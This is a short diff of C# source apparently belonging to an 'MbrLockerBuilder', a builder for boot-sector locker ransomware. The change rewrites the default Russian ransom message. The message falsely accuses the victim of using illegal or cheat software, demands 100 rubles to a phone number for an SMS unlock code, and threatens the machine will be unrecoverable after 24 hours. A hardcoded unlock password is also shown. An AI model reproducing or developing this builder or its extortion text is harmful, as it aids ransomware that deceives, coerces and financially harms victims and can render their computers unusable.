@@ -222,11 +222,11 @@ namespace MbrLockerBuilder
         }
 
         private void LoadDefaultValues()
-        {
-            this.txtTitle.Text = "Компьютер заблокирован!";
-            this.txtBody.Text = "Ваш компьютер заблокирован за использование нелегального ПО. Для разблокировки отправьте 100 рублей на номер +7xxxxxxxxxx.";
-            this.txtPassword.Text = "48284dkf8";
-        }
+{
+    this.txtTitle.Text = "Компьютер заблокирован!";
+    this.txtBody.Text = "Ваш компьютер заблокирован за использование нелегального ПО, включая чит ПО. Для разблокировки вашего компьютера необходимо отправить 100 рублей на номер +7xxxxxxxxxx, и вам приедет код разблокировки в сообщении. Внимание! В случае неуплаты в течение 24 часов компьютер будет невозможно восстановить.";
+    this.txtPassword.Text = "48284dkf8";
+}
 
         private void OnTextChanged(object sender, EventArgs e)
         {
